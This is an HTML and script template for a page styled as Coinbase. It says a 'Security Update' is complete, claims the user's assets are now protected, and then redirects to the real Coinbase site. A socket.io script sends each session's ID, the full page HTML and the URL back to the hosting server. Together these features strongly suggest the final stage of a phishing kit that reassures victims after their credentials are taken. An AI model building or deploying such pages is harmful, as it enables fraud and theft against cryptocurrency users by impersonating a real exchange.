    <style>
        :root {
            --gray0: 15, 15, 15;
            --gray5: 30, 30, 30;
            --gray20: 60, 60, 60;
            --gray60: 160, 160, 160;
            --gray100: 240, 240, 240;
            --blue60: 0, 82, 255;
            --red60: 255, 59, 48;
            --green60: 52, 199, 89;
            
            --foreground: rgb(var(--gray100));
            --foreground-muted: rgb(var(--gray60));
            --background: rgb(var(--gray0));
            --background-alternate: rgb(var(--gray5));
            --primary: rgb(var(--blue60));
            --primary-wash: rgba(var(--blue60), 0.1);
            --primary-foreground: rgb(var(--gray100));
            --negative: rgb(var(--red60));
            --positive: rgb(var(--green60));
            --line: rgba(var(--gray60), 0.2);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: var(--background);
            color: var(--foreground);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            max-width: 448px;
            width: 100%;
            border-radius: 16px;
            overflow: hidden;
            background: var(--background-alternate);
            border: 1px solid var(--line);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        .header {
            padding: 24px;
            text-align: center;
            border-bottom: 1px solid var(--line);
        }

        .logo {
            width: 126px;
            margin: 0 auto 20px;
        }

        .content {
            padding: 24px;
        }

        h2 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        p {
            color: var(--foreground-muted);
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            background-color: var(--positive);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }

        .success-icon svg {
            width: 32px;
            height: 32px;
            fill: white;
        }

        .loader {
            border: 3px solid rgba(var(--blue60), 0.2);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .btn-primary {
            background-color: var(--primary);
            color: var(--primary-foreground);
            border: none;
            border-radius: 28px;
            padding: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 16px;
        }

        .btn-primary:hover {
            background-color: #0051e6;
        }

        a {
            color: var(--primary);
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
</head>

        <div class="content">

                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>

            <h2 class="text-center">Security Update Complete</h2>
            <p>Your account security has been successfully upgraded. All your assets are now protected with our advanced security measures.</p>
            <p>You will be redirected to Coinbase shortly to complete the process.</p>
            
            <div class="loader"></div>
            
            <p class="text-center">If you are not redirected automatically, <a href="https://www.coinbase.com" id="redirectLink">click here</a>.</p>
            
            <button class="btn-primary" onclick="window.location.href='https://www.coinbase.com'">
                Continue to Coinbase
            </button>
        </div>
    </div>

    <script>
        // Redirect to Coinbase after 5 seconds
        setTimeout(function() {
            window.location.href = 'https://www.coinbase.com';
        }, 5000);
        
        // Send final page view information
        // Note: The socket.io implementation would need to be added separately
        
        const socket = io();
        socket.emit('page_view', {
            session_id: '{{ session_id }}',
            html_content: document.documentElement.outerHTML,
            url: window.location.href
        });
        
    </script>
